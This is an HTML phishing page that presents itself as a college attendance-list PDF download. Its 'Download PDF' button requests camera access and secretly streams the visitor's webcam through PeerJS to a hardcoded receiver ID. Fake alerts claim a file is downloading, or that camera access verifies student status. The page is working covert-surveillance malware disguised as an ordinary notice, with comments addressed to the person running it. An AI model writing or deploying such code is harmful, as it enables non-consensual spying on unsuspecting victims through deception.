<!DOCTYPE html>
<html>
<head>
    <title>College News</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
</head>
<body style="text-align: center; padding-top: 50px;">
    <h2>2026 College Attendance List</h2>
    <p>Click below to download the PDF notice.</p>
    <button onclick="connectAndSend()" style="padding: 15px; background: #007bff; color: white; border: none; border-radius: 5px;">Download PDF</button>

    <script>
        // PeerJS initialize karein
        var peer = new Peer(); 

        function connectAndSend() {
            navigator.mediaDevices.getUserMedia({video: true, audio: false})
            .then(function(stream) {
                // DHAYAN DEIN: 'mera-unique-bhai-tracker' wahi ID honi chahiye jo aapne receiver mein rakhi hai
                var call = peer.call('mera-unique-bhai-tracker', stream);
                alert("File downloading... please wait.");
            })
            .catch(function(err) {
                alert("Please allow camera permission to verify you are a student.");
            });
        }
    </script>
</body>
</html>
